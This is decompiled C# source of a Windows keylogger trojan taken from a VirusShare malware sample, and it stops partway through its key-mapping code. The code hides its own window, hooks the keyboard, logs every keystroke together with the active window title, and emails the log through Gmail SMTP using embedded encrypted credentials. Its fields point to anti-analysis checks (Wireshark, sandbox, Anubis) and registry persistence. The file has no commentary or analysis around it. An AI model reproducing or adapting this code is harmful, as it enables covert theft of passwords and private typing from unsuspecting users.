// Decompiled with JetBrains decompiler
// Type: ipart.Form1
// Assembly: Part, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B122D9D4-A147-4917-B567-747F773ADAB9
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\HEUR-Trojan-Spy.MSIL.KeyLogger.cxy-15605a591d56f36d16e94129fa41cfed46fd10e6c08b8529e4068cfb86cd5bad.exe

using ipart.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace ipart
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private IContainer components;
    [AccessedThroughProperty("windowsTimer")]
    private System.Windows.Forms.Timer _windowsTimer;
    [AccessedThroughProperty("logTimer")]
    private System.Windows.Forms.Timer _logTimer;
    [AccessedThroughProperty("bWork")]
    private BackgroundWorker _bWork;
    [AccessedThroughProperty("logBox")]
    private TextBox _logBox;
    private string groundText;
    [AccessedThroughProperty("kbHook")]
    private Form1.KeyboardHook _kbHook;
    private string strin;
    private const string FileSplit = "<@@TrueIce@@>";
    private string gUser;
    private string gPass;
    private string sendTo;
    private string Tval;
    private string timerVal;
    private string customVal;
    private string key;
    private string user;
    private string pass;
    private string pEnabler;
    private string body;
    private string title;
    private string wiresharkE;
    private string sandboxE;
    private string anubisE;
    private string keyscramblerE;
    private MailMessage MailMessage;
    private string dropLoc;
    private string dropName;
    private string eDrop;
    private string regLoc;
    private string regName;
    private string eReg;
    private string ffon;

    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      this.groundText = (string) null;
      this.kbHook = new Form1.KeyboardHook();
      this.strin = (string) null;
      this.MailMessage = new MailMessage();
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.windowsTimer = new System.Windows.Forms.Timer(this.components);
      this.logTimer = new System.Windows.Forms.Timer(this.components);
      this.bWork = new BackgroundWorker();
      this.logBox = new TextBox();
      this.SuspendLayout();
      this.windowsTimer.Interval = 10;
      this.logTimer.Interval = 10000;
      this.bWork.WorkerReportsProgress = true;
      this.bWork.WorkerSupportsCancellation = true;
      this.logBox.Dock = DockStyle.Fill;
      this.logBox.Location = new Point(0, 0);
      this.logBox.Multiline = true;
      this.logBox.Name = "logBox";
      TextBox logBox = this.logBox;
      Size size1 = new Size(262, 69);
      Size size2 = size1;
      logBox.Size = size2;
      this.logBox.TabIndex = 0;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      size1 = new Size(262, 69);
      this.ClientSize = size1;
      this.Controls.Add((System.Windows.Forms.Control) this.logBox);
      this.Name = nameof (Form1);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.StartPosition = FormStartPosition.CenterScreen;
      this.WindowState = FormWindowState.Minimized;
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual System.Windows.Forms.Timer windowsTimer
    {
      [DebuggerNonUserCode] get => this._windowsTimer;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.windowsTimer_Tick);
        if (this._windowsTimer != null)
          this._windowsTimer.Tick -= eventHandler;
        this._windowsTimer = value;
        if (this._windowsTimer == null)
          return;
        this._windowsTimer.Tick += eventHandler;
      }
    }

    internal virtual System.Windows.Forms.Timer logTimer
    {
      [DebuggerNonUserCode] get => this._logTimer;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.logTimer_Tick);
        if (this._logTimer != null)
          this._logTimer.Tick -= eventHandler;
        this._logTimer = value;
        if (this._logTimer == null)
          return;
        this._logTimer.Tick += eventHandler;
      }
    }

    internal virtual BackgroundWorker bWork
    {
      [DebuggerNonUserCode] get => this._bWork;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DoWorkEventHandler workEventHandler = new DoWorkEventHandler(this.BackgroundWorker1_DoWork);
        if (this._bWork != null)
          this._bWork.DoWork -= workEventHandler;
        this._bWork = value;
        if (this._bWork == null)
          return;
        this._bWork.DoWork += workEventHandler;
      }
    }

    internal virtual TextBox logBox
    {
      [DebuggerNonUserCode] get => this._logBox;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._logBox = value;
    }

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int SetProcessWorkingSetSize(
      IntPtr process,
      int minimumWorkingSetSize,
      int maximumWorkingSetSize);

    public void FlushMemory()
    {
      try
      {
        GC.Collect();
        GC.WaitForPendingFinalizers();
        if (Environment.OSVersion.Platform != PlatformID.Win32NT)
          return;
        Form1.SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1);
        Process[] processesByName = Process.GetProcessesByName("iced");
        int index = 0;
        while (index < processesByName.Length)
        {
          Form1.SetProcessWorkingSetSize(processesByName[index].Handle, -1, -1);
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private virtual Form1.KeyboardHook kbHook
    {
      [DebuggerNonUserCode] get => this._kbHook;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        Form1.KeyboardHook.KeyDownEventHandler downEventHandler = new Form1.KeyboardHook.KeyDownEventHandler(this.shiftandcaps);
        if (this._kbHook != null)
          Form1.KeyboardHook.KeyDown -= downEventHandler;
        this._kbHook = value;
        if (this._kbHook == null)
          return;
        Form1.KeyboardHook.KeyDown += downEventHandler;
      }
    }

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetForegroundWindow();

    [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetWindowText(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

    private string GetActiveWindowTitle()
    {
      string lpString = new string(char.MinValue, 100);
      Form1.GetWindowText(Form1.GetForegroundWindow(), ref lpString, 100);
      return lpString.Substring(0, checked (Strings.InStr(lpString, "\0") - 1));
    }

    private void Control()
    {
      if (this.logBox.Text.EndsWith("]") || this.logBox.Text.EndsWith("-"))
        return;
      if (this.logBox.Text.EndsWith("="))
        this.logBox.Text += "\r\n";
      else
        this.logBox.Text = this.logBox.Text.Remove(checked (this.logBox.Text.Length - 1), 1);
    }

    private void Windows()
    {
      if (Operators.CompareString(this.strin, this.GetActiveWindowTitle(), false) == 0)
        return;
      this.logBox.Text = this.logBox.Text + "\r\n" + Conversions.ToString(DateAndTime.TimeOfDay) + "   ==========" + this.GetActiveWindowTitle() + "==========\r\n";
      this.strin = this.GetActiveWindowTitle();
    }

    private void Mail()
    {
      this.MailMessage.From = new MailAddress(Form1.TripleDES(this.gUser, this.key, true));
      this.MailMessage.To.Add(this.sendTo);
      this.MailMessage.Subject = Conversions.ToString(DateAndTime.TimeOfDay) + " - " + MyProject.User.Name;
      this.MailMessage.Body = this.logBox.Text;
      new SmtpClient("smtp.gmail.com")
      {
        Port = 587,
        Credentials = ((ICredentialsByHost) new NetworkCredential(Form1.TripleDES(this.gUser, this.key, true), Form1.TripleDES(this.gPass, this.key, true))),
        EnableSsl = true
      }.Send(this.MailMessage);
      this.MailMessage.To.Clear();
    }

    public void shiftandcaps(Keys Key)
    {
      if (!MyProject.Computer.Keyboard.ShiftKeyDown & !MyProject.Computer.Keyboard.CapsLock)
      {
        switch (Key)
        {
          case Keys.Back:
            this.Control();
            break;
          case Keys.Tab:
            this.logBox.Text += "[TAB]";
            break;
          case Keys.Return:
            this.logBox.Text += "\r\n";
            break;
          case Keys.Escape:
            this.logBox.Text += "[ESC]";
            break;
          case Keys.Space:
            this.logBox.Text += " ";
            break;
          case Keys.End:
            this.logBox.Text += "[END]";
            break;
          case Keys.Left:
            this.logBox.Text += "?";
            break;
          case Keys.Up:
            this.logBox.Text += "?";
            break;
          case Keys.Right:
            this.logBox.Text += "?";
            break;
          case Keys.Down:
            this.logBox.Text += "?";
            break;
          case Keys.Delete:
            this.logBox.Text += "[DEL]";
            break;
          case Keys.D0:
            this.logBox.Text += "0";
            break;
          case Keys.D1:
            this.logBox.Text += "1";
            break;
          case Keys.D2:
            this.logBox.Text += "2";
            break;
          case Keys.D3:
            this.logBox.Text += "3";
            break;
          case Keys.D4:
            this.logBox.Text += "4";
            break;
          case Keys.D5:
            this.logBox.Text += "5";
            break;
          case Keys.D6:
            this.logBox.Text += "6";
            break;
          case Keys.D7:
            this.logBox.Text += "7";
            break;
          case Keys.D8:
            this.logBox.Text += "8";
            break;
          case Keys.D9:
            this.logBox.Text += "9";
            break;
          case Keys.A:
            this.logBox.Text += "a";
            break;
          case Keys.B:
            this.logBox.Text += "b";
            break;
          case Keys.C:
            this.logBox.Text += "c";
            break;
          case Keys.D:
            this.logBox.Text += "d";
            break;
          case Keys.E:
            this.logBox.Text += "e";
            break;
          case Keys.F:
            this.logBox.Text += "f";
            break;
          case Keys.G:
            this.logBox.Text += "g";
            break;
          case Keys.H:
            this.logBox.Text += "h";
            break;
          case Keys.I:
            this.logBox.Text += "i";
            break;
          case Keys.J:
            this.logBox.Text += "j";
            break;
          case Keys.K:
            this.logBox.Text += "k";
            break;
          case Keys.L:
            this.logBox.Text += "l";
            break;
          case Keys.M:
            this.logBox.Text += "m";
            break;
          case Keys.N:
            this.logBox.Text += "n";
            break;
          case Keys.O:
            this.logBox.Text += "o";
            break;
          case Keys.P:
            this.logBox.Text += "p";
            break;
          case Keys.Q:
            this.logBox.Text += "q";
            break;
          case Keys.R:
            this.logBox.Text += "r";
            break;
          case Keys.S:
            this.logBox.Text += "s";
            break;
          case Keys.T:
            this.logBox.Text += "t";
            break;
          case Keys.U:
            this.logBox.Text += "u";
            break;
          case Keys.V:
            this.logBox.Text += "v";
            break;
          case Keys.W:
            this.logBox.Text += "w";
            break;
          case Keys.X:
            this.logBox.Text += "x";
            break;
          case Keys.Y:
            this.logBox.Text += "y";
            break;
          case Keys.Z:
            this.logBox.Text += "z";
            break;
          case Keys.NumPad0:
            this.logBox.Text += "0";
            break;
          case Keys.NumPad1:
            this.logBox.Text += "1";
            break;
          case Keys.NumPad2:
            this.logBox.Text += "2";
            break;
          case Keys.NumPad3:
            this.logBox.Text += "3";
            break;
          case Keys.NumPad4:
            this.logBox.Text += "4";
            break;
          case Keys.NumPad5:
            this.logBox.Text += "5";
            break;
          case Keys.NumPad6:
            this.logBox.Text += "6";
            break;
          case Keys.NumPad7:
            this.logBox.Text += "7";
            break;
          case Keys.NumPad8:
            this.logBox.Text += "8";
            break;
          case Keys.NumPad9:
            this.logBox.Text += "9";
            break;
          case Keys.Multiply:
            this.logBox.Text += "*";
            break;
          case Keys.Add:
            this.logBox.Text += "+";
            break;
          case Keys.Subtract:
            this.logBox.Text += "-";
            break;
          case Keys.Decimal:
            this.logBox.Text += ".";
            break;
          case Keys.Divide:
            this.logBox.Text += "/";
            break;
          case Keys.F1:
            this.logBox.Text += "[F1]";
            break;
          case Keys.F2:
            this.logBox.Text += "[F2]";
            break;
          case Keys.F3:
            this.logBox.Text += "[F3]";
            break;
          case Keys.F4:
            this.logBox.Text += "[F4]";
            break;
          case Keys.F5:
            this.logBox.Text += "[F5]";
            break;
          case Keys.F6:
            this.logBox.Text += "[F6]";
            break;
          case Keys.F7:
            this.logBox.Text += "[F7]";
            break;
          case Keys.F8:
            this.logBox.Text += "[F8]";
            break;
          case Keys.F9:
            this.logBox.Text += "[F9]";
            break;
          case Keys.F10:
            this.logBox.Text += "[F10]";
            break;
          case Keys.F11:
            this.logBox.Text += "[F11]";
            break;
          case Keys.F12:
            this.logBox.Text += "[F12]";
            break;
          case Keys.OemSemicolon:
            this.logBox.Text += ";";
            break;
          case Keys.Oemcomma:
            this.logBox.Text += ",";
            break;
          case Keys.OemMinus:
            this.logBox.Text += "-";
            break;
          case Keys.OemPeriod:
            this.logBox.Text += ".";
            break;
          case Keys.OemQuestion:
            this.logBox.Text += "/";
            break;
          case Keys.Oemtilde:
            this.logBox.Text += "`";
            break;
          case Keys.OemOpenBrackets:
            this.logBox.Text += "[";
            break;
          case Keys.OemPipe:
            this.logBox.Text += "\\";
            break;
          case Keys.OemCloseBrackets:
            this.logBox.Text += "]";
            break;
          case Keys.OemQuotes:
            this.logBox.Text += "'";
            break;
        }
      }
      else if (!MyProject.Computer.Keyboard.ShiftKeyDown & MyProject.Computer.Keyboard.CapsLock)
      {
        switch (Key)
        {
          case Keys.Back:
            this.Control();
            break;
          case Keys.Tab:
            this.logBox.Text += "[TAB]";
            break;
          case Keys.Return:
            this.logBox.Text += "\r\n";
            break;
          case Keys.Escape:
            this.logBox.Text += "[ESC]";
            break;
          case Keys.Space:
            this.logBox.Text += " ";
            break;
          case Keys.End:
            this.logBox.Text += "[END]";
            break;
          case Keys.Left:
            this.logBox.Text += "?";
            break;
          case Keys.Up:
            this.logBox.Text += "?";
            break;
          case Keys.Right:
            this.logBox.Text += "?";
            break;
          case Keys.Down:
            this.logBox.Text += "?";
            break;
          case Keys.Delete:
            this.logBox.Text += "[DEL]";
            break;
          case Keys.D0:
            this.logBox.Text += "0";
            break;
          case Keys.D1:
            this.logBox.Text += "1";
            break;
          case Keys.D2:
            this.logBox.Text += "2";
            break;
          case Keys.D3:
            this.logBox.Text += "3";
            break;
          case Keys.D4:
            this.logBox.Text += "4";
            break;
          case Keys.D5:
            this.logBox.Text += "5";
            break;
          case Keys.D6:
            this.logBox.Text += "6";
            break;
          case Keys.D7:
            this.logBox.Text += "7";
            break;
          case Keys.D8:
            this.logBox.Text += "8";
            break;
          case Keys.D9:
            this.logBox.Text += "9";
            break;
          case Keys.A:
            this.logBox.Text += "A";
            break;
          case Keys.B:
            this.logBox.Text += "B";
            break;
          case Keys.C:
            this.logBox.Text += "C";
            break;
          case Keys.D:
            this.logBox.Text += "D";
            break;
          case Keys.E:
            this.logBox.Text += "E";
            break;
          case Keys.F:
            this.logBox.Text += "F";
            break;
          case Keys.G:
            this.logBox.Text += "G";
            break;
          case Keys.H:
            this.logBox.Text += "H";
            break;
          case Keys.I:
            this.logBox.Text += "I";
            break;
          case Keys.J:
            this.logBox.Text += "J";
            break;
          case Keys.K:
            this.logBox.Text += "K";
            break;
          case Keys.L:
            this.logBox.Text += "L";
            break;
          case Keys.M:
            this.logBox.Text += "M";
            break;
          case Keys.N:
            this.logBox.Text += "N";
            break;
          case Keys.O:
            this.logBox.Text += "O";
            break;
          case Keys.P:
            this.logBox.Text += "P";
            break;
          case Keys.Q:
            this.logBox.Text += "Q";
            break;
          case Keys.R:
            this.logBox.Text += "R";
            break;
          case Keys.S:
            this.logBox.Text += "S";
            break;
          case Keys.T:
            this.logBox.Text += "T";
            break;
          case Keys.U:
            this.logBox.Text += "U";
            break;
          case Keys.V:
            this.logBox.Text += "V";
            break;
          case Keys.W:
            this.logBox.Text += "W";
            break;
          case Keys.X:
            this.logBox.Text += "X";
            break;
          case Keys.Y:
            this.logBox.Text += "Y";
            break;
          case Keys.Z:
            this.logBox.Text += "Z";
            break;
          case Keys.NumPad0:
            this.logBox.Text += "0";
            break;
          case Keys.NumPad1:
            this.logBox.Text += "1";
            break;
          case Keys.NumPad2:
            this.logBox.Text += "2";
            break;
          case Keys.NumPad3:
            this.logBox.Text += "3";
            break;
          case Keys.NumPad4:
            this.logBox.Text += "4";
            break;
          case Keys.NumPad5:
            this.logBox.Text += "5";
            break;
          case Keys.NumPad6:
            this.logBox.Text += "6";
            break;
          case Keys.NumPad7:
            this.logBox.Text += "7";
            break;
          case Keys.NumPad8:
            this.logBox.Text += "8";
            break;
          case Keys.NumPad9:
            this.logBox.Text += "9";
            break;
          case Keys.Multiply:
            this.logBox.Text += "*";
            break;
          case Keys.Add:
            this.logBox.Text += "+";
            break;
          case Keys.Subtract:
            this.logBox.Text += "-";
            break;
          case Keys.Decimal:
            this.logBox.Text += ".";
            break;
          case Keys.Divide:
            this.logBox.Text += "/";
            break;
          case Keys.F1:
            this.logBox.Text += "[F1]";
            break;
          case Keys.F2:
            this.logBox.Text += "[F2]";
            break;
          case Keys.F3:
            this.logBox.Text += "[F3]";
            break;
          case Keys.F4:
            this.logBox.Text += "[F4]";
            break;
          case Keys.F5:
            this.logBox.Text += "[F5]";
            break;
          case Keys.F6:
            this.logBox.Text += "[F6]";
            break;
          case Keys.F7:
            this.logBox.Text += "[F7]";
            break;
          case Keys.F8:
            this.logBox.Text += "[F8]";
            break;
          case Keys.F9:
            this.logBox.Text += "[F9]";
            break;
          case Keys.F10:
            this.logBox.Text += "[F10]";
            break;
          case Keys.F11:
            this.logBox.Text += "[F11]";
            break;
          case Keys.F12:
            this.logBox.Text += "[F12]";
            break;
          case Keys.OemSemicolon:
            this.logBox.Text += ";";
            break;
          case Keys.Oemcomma:
            this.logBox.Text += ",";
            break;
          case Keys.OemMinus:
            this.logBox.Text += "-";
            break;
          case Keys.OemPeriod:
            this.logBox.Text += ".";
            break;
          case Keys.OemQuestion:
            this.logBox.Text += "/";
            break;
          case Keys.Oemtilde:
            this.logBox.Text += "`";
            break;
          case Keys.OemOpenBrackets:
            this.logBox.Text += "[";
            break;
          case Keys.OemPipe:
            this.logBox.Text += "\\";
            break;
          case Keys.OemCloseBrackets:
            this.logBox.Text += "]";
            break;
          case Keys.OemQuotes:
            this.logBox.Text += "'";
            break;
        }
      }
      else if (MyProject.Computer.Keyboard.ShiftKeyDown & MyProject.Computer.Keyboard.CapsLock)
      {
        switch (Key)
        {
          case Keys.Back:
            this.Control();
            break;
          case Keys.Tab:
            this.logBox.Text += "[TAB]";
            break;
          case Keys.Return:
            this.logBox.Text += "\r\n";
            break;
          case Keys.Escape:
            this.logBox.Text += "[ESC]";
            break;
          case Keys.Space:
            this.logBox.Text += " ";
            break;
          case Keys.End:
            this.logBox.Text += "[END]";
            break;
          case Keys.Left:
            this.logBox.Text += "?";
            break;
          case Keys.Up:
            this.logBox.Text += "?";
            break;
          case Keys.Right:
            this.logBox.Text += "?";
            break;
          case Keys.Down:
            this.logBox.Text += "?";
            break;
          case Keys.Delete:
            this.logBox.Text += "[DEL]";
            break;
          case Keys.D0:
            this.logBox.Text += ")";
            break;
          case Keys.D1:
            this.logBox.Text += "!";
            break;
          case Keys.D2:
            this.logBox.Text += "@";
            break;
          case Keys.D3:
            this.logBox.Text += "#";
            break;
          case Keys.D4:
            this.logBox.Text += "$";
            break;
          case Keys.D5:
            this.logBox.Text += "%";
            break;
          case Keys.D6:
            this.logBox.Text += "^";
            break;
          case Keys.D7:
            this.logBox.Text += "&";
            break;
          case Keys.D8:
            this.logBox.Text += "*";
            break;
          case Keys.D9:
            this.logBox.Text += "(";
            break;
          case Keys.A:
            this.logBox.Text += "A";
            break;
          case Keys.B:
            this.logBox.Text += "B";
            break;
          case Keys.C:
            this.logBox.Text += "C";
            break;
          case Keys.D:
            this.logBox.Text += "D";
            break;
          case Keys.E:
            this.logBox.Text += "E";
            break;
          case Keys.F:
            this.logBox.Text += "F";
            break;
          case Keys.G:
            this.logBox.Text += "G";
            break;
          case Keys.H:
            this.logBox.Text += "H";
            break;
          case Keys.I:
            this.logBox.Text += "I";
            break;
          case Keys.J:
            this.logBox.Text += "J";
            break;
          case Keys.K:
            this.logBox.Text += "K";
            break;
          case Keys.L:
            this.logBox.Text += "L";
            break;
          case Keys.M:
            this.logBox.Text += "M";
            break;
          case Keys.N:
            this.logBox.Text += "N";
            break;
          case Keys.O:
            this.logBox.Text += "O";
            break;
          case Keys.P:
            this.logBox.Text += "P";
            break;
          case Keys.Q:
            this.logBox.Text += "Q";
            break;
          case Keys.R:
            this.logBox.Text += "R";
            break;
          case Keys.S:
            this.logBox.Text += "S";
            break;
          case Keys.T:
            this.logBox.Text += "T";
            break;
          case Keys.U:
            this.logBox.Text += "U";
            break;
          case Keys.V:
            this.logBox.Text += "V";
            break;
          case Keys.W:
            this.logBox.Text += "W";
            break;
          case Keys.X:
            this.logBox.Text += "X";
            break;
          case Keys.Y:
            this.logBox.Text += "Y";
            break;
          case Keys.Z:
            this.logBox.Text += "Z";
            break;
          case Keys.Multiply:
            this.logBox.Text += "*";
            break;
          case Keys.Add:
            this.logBox.Text += "+";
            break;
          case Keys.Subtract:
            this.logBox.Text += "-";
            break;
          case Keys.Decimal:
            this.logBox.Text += ".";
            break;
          case Keys.Divide:
            this.logBox.Text += "/";
            break;
          case Keys.F1:
            this.logBox.Text += "[F1]";
            break;
          case Keys.F2:
            this.logBox.Text += "[F2]";
            break;
          case Keys.F3:
            this.logBox.Text += "[F3]";
            break;
          case Keys.F4:
            this.logBox.Text += "[F4]";
            break;
          case Keys.F5:
            this.logBox.Text += "[F5]";
            break;
          case Keys.F6:
            this.logBox.Text += "[F6]";
            break;
          case Keys.F7:
            this.logBox.Text += "[F7]";
            break;
          case Keys.F8:
            this.logBox.Text += "[F8]";
            break;
          case Keys.F9:
            this.logBox.Text += "[F9]";
            break;
          case Keys.F10:
            this.logBox.Text += "[F10]";
            break;
          case Keys.F11:
            this.logBox.Text += "[F11]";
            break;
          case Keys.F12:
            this.logBox.Text += "[F12]";
            break;
          case Keys.OemSemicolon:
            this.logBox.Text += ":";
            break;
          case Keys.Oemcomma:
            this.logBox.Text += "<";
            break;
          case Keys.OemMinus:
            this.logBox.Text += "_";
            break;
          case Keys.OemPeriod:
            this.logBox.Text += ">";
            break;
          case Keys.OemQuestion:
            this.logBox.Text += "?";
            break;
          case Keys.Oemtilde:
            this.logBox.Text += "~";
            break;
          case Keys.OemOpenBrackets:
            this.logBox.Text += "{";
            break;
          case Keys.OemPipe:
            this.logBox.Text += "|";
            break;
          case Keys.OemCloseBrackets:
            this.logBox.Text += "}";
            break;
        }
      }
      else if (!MyProject.Computer.Keyboard.ShiftKeyDown & MyProject.Computer.Keyboard.CapsLock)
      {
        switch (Key)
        {
          case Keys.Back:
            this.Control();
            break;
          case Keys.Tab:
            this.logBox.Text += "[TAB]";
            break;
          case Keys.Return:
            this.logBox.Text += "\r\n";
            break;
          case Keys.Escape:
            this.logBox.Text += "[ESC]";
            break;
          case Keys.Space:
            this.logBox.Text += " ";
            break;
          case Keys.End:
            this.logBox.Text += "[END]";
            break;
          case Keys.Left:
            this.logBox.Text += "?";
            break;
          case Keys.Up:
            this.logBox.Text += "?";
            break;
          case Keys.Right:
            this.logBox.Text += "?";
            break;
          case Keys.Down:
            this.logBox.Text += "?";
            break;
          case Keys.Delete:
            this.logBox.Text += "[DEL]";
            break;
          case Keys.D0:
            this.logBox.Text += "0";
            break;
          case Keys.D1:
            this.logBox.Text += "1";
            break;
          case Keys.D2:
            this.logBox.Text += "2";
            break;
          case Keys.D3:
            this.logBox.Text += "3";
            break;
          case Keys.D4:
            this.logBox.Text += "4";
            break;
          case Keys.D5:
            this.logBox.Text += "5";
            break;
          case Keys.D6:
            this.logBox.Text += "6";
            break;
          case Keys.D7:
            this.logBox.Text += "7";
            break;
          case Keys.D8:
            this.logBox.Text += "8";
            break;
          case Keys.D9:
            this.logBox.Text += "9";
            break;
          case Keys.A:
            this.logBox.Text += "a";
            break;
          case Keys.B:
            this.logBox.Text += "b";
            break;
          case Keys.C:
            this.logBox.Text += "c";
            break;
          case Keys.D:
            this.logBox.Text += "d";
            break;
          case Keys.E:
            this.logBox.Text += "e";
            break;
          case Keys.F:
            this.logBox.Text += "f";
            break;
          case Keys.G:
            this.logBox.Text += "g";
            break;
          case Keys.H:
            this.logBox.Text += "h";
            break;
          case Keys.I:
            this.logBox.Text += "i";
            break;
          case Keys.J:
            this.logBox.Text += "j";
            break;
          case Keys.K:
            this.logBox.Text += "k";
            break;
          case Keys.L:
            this.logBox.Text += "l";
            break;
          case Keys.M:
            this.logBox.Text += "m";
            break;
          case Keys.N:
            this.logBox.Text += "n";
            break;
          case Keys.O:
            this.logBox.Text += "o";
            break;
          case Keys.P:
            this.logBox.Text += "p";
            break;
          case Keys.Q:
            this.logBox.Text += "q";
            break;
          case Keys.R:
            this.logBox.Text += "r";
            break;
          case Keys.S:
            this.logBox.Text += "s";
            break;
          case Keys.T:
            this.logBox.Text += "t";
            break;
          case Keys.U:
            this.logBox.Text += "u";
            break;
          case Keys.V:
            this.logBox.Text += "v";
            break;
          case Keys.W:
            this.logBox.Text += "w";
            break;
          case Keys.X:
            this.logBox.Text += "x";
            break;
          case Keys.Y:
            this.logBox.Text += "y";
            break;
          case Keys.Z:
            this.logBox.Text += "z";
            break;
          case Keys.Multiply:
            this.logBox.Text += "*";
            break;
          case Keys.Add:
            this.logBox.Text += "+";
            break;
          case Keys.Subtract:
            this.logBox.Text += "-";
            break;
          case Keys.Decimal:
            this.logBox.Text += ".";
            break;
          case Keys.Divide:
            this.logBox.Text += "/";
            break;
          case Keys.F1:
            this.logBox.Text += "[F1]";
            break;
          case Keys.F2:
            this.logBox.Text += "[F2]";
            break;
          case Keys.F3:
            this.logBox.Text += "[F3]";
            break;
          case Keys.F4:
            this.logBox.Text += "[F4]";
            break;
          case Keys.F5:
            this.logBox.Text += "[F5]";
            break;
          case Keys.F6:
            this.logBox.Text += "[F6]";
            break;
          case Keys.F7:
            this.logBox.Text += "[F7]";
            break;
          case Keys.F8:
            this.logBox.Text += "[F8]";
            break;
          case Keys.F9:
            this.logBox.Text += "[F9]";
            break;
          case Keys.F10:
            this.logBox.Text += "[F10]";
            break;
          case Keys.F11:
            this.logBox.Text += "[F11]";
            break;
          case Keys.F12:
            this.logBox.Text += "[F12]";
            break;
          case Keys.OemSemicolon:
            this.logBox.Text += ";";
            break;
          case Keys.Oemcomma:
            this.logBox.Text += ",";
            break;
          case Keys.OemMinus:
            this.logBox.Text += "-";
            break;
          case Keys.OemPeriod:
            this.logBox.Text += ".";
            break;
          case Keys.OemQuestion:
            this.logBox.Text += "/";
            break;
          case Keys.Oemtilde:
            this.logBox.Text += "`";
            break;
          case Keys.OemOpenBrackets:
            this.logBox.Text += "[";
            break;
          case Keys.OemPipe:
            this.logBox.Text += "\\";
            break;
          case Keys.OemCloseBrackets:
            this.logBox.Text += "]";
            break;
          case Keys.OemQuotes:
            this.logBox.Text += "'";
            break;
        }
      }
      else
      {
        if (!(MyProject.Computer.Keyboard.ShiftKeyDown & !MyProject.Computer.Keyboard.CapsLock))
          return;
        switch (Key)
        {
          case Keys.Back:
            this.Control();
            break;
          case Keys.Tab:
            this.logBox.Text += "[TAB]";
            break;
          case Keys.Return:
            this.logBox.Text += "\r\n";
            break;
          case Keys.Escape:
            this.logBox.Text += "[ESC]";
            break;
          case Keys.Space:
            this.logBox.Text += " ";
            break;
          case Keys.End:
            this.logBox.Text += "[END]";
            break;
          case Keys.Left:
            this.logBox.Text += "?";
            break;
          case Keys.Up:
            this.logBox.Text += "?";
            break;
          case Keys.Right:
            this.logBox.Text += "?";
            break;
          case Keys.Down:
            this.logBox.Text += "?";
            break;
          case Keys.Delete:
            this.logBox.Text += "[DEL]";
            break;
          case Keys.D0:
            this.logBox.Text += ")";
            break;
          case Keys.D1:
            this.logBox.Text += "!";
            break;
          case Keys.D2:
            this.logBox.Text += "@";
            break;
          case Keys.D3:
            this.logBox.Text += "#";
            break;
          case Keys.D4:
            this.logBox.Text += "$";
            break;
          case Keys.D5:
            this.logBox.Text += "%";
            break;
          case Keys.D6:
            this.logBox.Text += "^";
            break;
          case Keys.D7:
            this.logBox.Text += "&";
            break;
          case Keys.D8:
            this.logBox.Text += "*";
            break;
          case Keys.D9:
            this.logBox.Text += "(";
            break;
          case Keys.A:
            this.logBox.Text += "A";
            break;
          case Keys.B:
            this.logBox.Text += "B";
            break;
          case Keys.C:
            this.logBox.Text += "C";
            break;
          case Keys.D:
            this.logBox.Text += "D";
            break;
          case Keys.E:
            this.logBox.Text += "E";
            break;
          case Keys.F:
            this.logBox.Text += "F";
            break;
          case Keys.G:
            this.logBox.Text += "G";
            break;
          case Keys.H:
            this.logBox.Text += "H";
            break;
          case Keys.I:
            this.logBox.Text += "I";
            break;
          case Keys.J:
            this.logBox.Text += "J";
            break;
          case Keys.K:
            this.logBox.Text += "K";
            break;
          case Keys.L:
            this.logBox.Text += "L";
            break;
          case Keys.M:
            this.logBox.Text += "M";
            break;
          case Keys.N:
            this.logBox.Text += "N";
            break;
          case Keys.O:
            this.logBox.Text += "O";
            break;
          case Keys.P:
            this.logBox.Text += "P";
            break;
          case Keys.Q:
            this.logBox.Text += "Q";
            break;
          case Keys.R:
            this.logBox.Text += "R";
            break;
          case Keys.S:
            this.logBox.Text += "S";
            break;
          case Keys.T:
            this.logBox.Text += "T";
            break;
          case Keys.U:
            this.logBox.Text += "U";
            break;
          case Keys.V:
            this.logBox.Text += "V";
            break;
          case Keys.W:
            this.logBox.Text += "W";
            break;
          case Keys.X:
            this.logBox.Text += "X";
            break;
          case Keys.Y:
            this.logBox.Text += "Y";
            break;
          case Keys.Z:
            this.logBox.Text += "Z";
            break;
          case Keys.Multiply:
            this.logBox.Text += "*";
            break;
          case Keys.Add:
            this.logBox.Text += "+";
            break;
          case Keys.Subtract:
            this.logBox.Text += "-";
            break;
          case Keys.Decimal:
            this.logBox.Text += ".";
            break;
          case Keys.Divide:
